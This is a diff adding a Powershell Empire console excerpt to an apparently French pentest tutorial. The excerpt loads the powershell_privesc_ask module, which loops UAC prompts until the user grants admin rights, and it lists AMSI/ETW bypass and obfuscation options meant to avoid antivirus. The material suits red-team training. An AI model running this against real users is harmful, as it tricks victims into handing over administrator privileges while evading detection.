@@ -66,3 +66,59 @@ Une technique consiste simplement à demander à l'utilisateur en boucle jusqu'�
 
 Pour cela on va utiliser le module `powershell_privesc_ask`.
 
+```shell
+(Empire: 9UPHL3C1) > usemodule powershell_privesc_ask
+INFO: Set Agent to 9UPHL3C1 
+
+ id           powershell_privesc_ask                                                 
+ authors      Jack64, ,                                                              
+ description  Leverages Start-Process -Verb runAs option inside a YES-Required loop 
+              to prompt the user for a high integrity context before running the     
+              agent code. UAC will report Powershell is requesting Administrator     
+              privileges. Because this does not use the BypassUAC DLLs, it should    
+              not trigger any AV alerts.                                             
+ background   True                                                                   
+ language     powershell                                                             
+ needs_admin  False                                                                  
+ opsec_safe   False                                                                  
+ techniques   http://attack.mitre.org/techniques/T1088                               
+ comments     https://github.com/rapid7/metasploit-                                  
+              framework/blob/master/modules/exploits/windows/local/ask.rb            
+
+
+┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
+│ Name             │ Value              │ Required │ Description                         │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Agent            │ 9UPHL3C1           │ True     │ Agent to run module on.             │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Listener         │                    │ True     │ Listener to use.                    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
+│                  │                    │          │ powershell code, uses the           │
+│                  │                    │          │ ObfuscateCommand for obfuscation    │
+│                  │                    │          │ types. For powershell only.         │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
+│                  │                    │          │ use. Only used if Obfuscate switch  │
+│                  │                    │          │ is True. For powershell only.       │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
+│                  │                    │          │ to be prepended to the launcher.    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
+│                  │                    │          │ staging request (default, none, or  │
+│                  │                    │          │ other).                             │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
+│                  │                    │          │ none, or other).                    │
+├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
+│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
+│                  │                    │          │ ([domain\]username:password) to use │
+│                  │                    │          │ for request (default, none, or      │
+│                  │                    │          │ other).                             │
+└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
+
+(Empire: usemodule/powershell_privesc_ask) > set Listener http
+INFO: Set Listener to http
+
+```
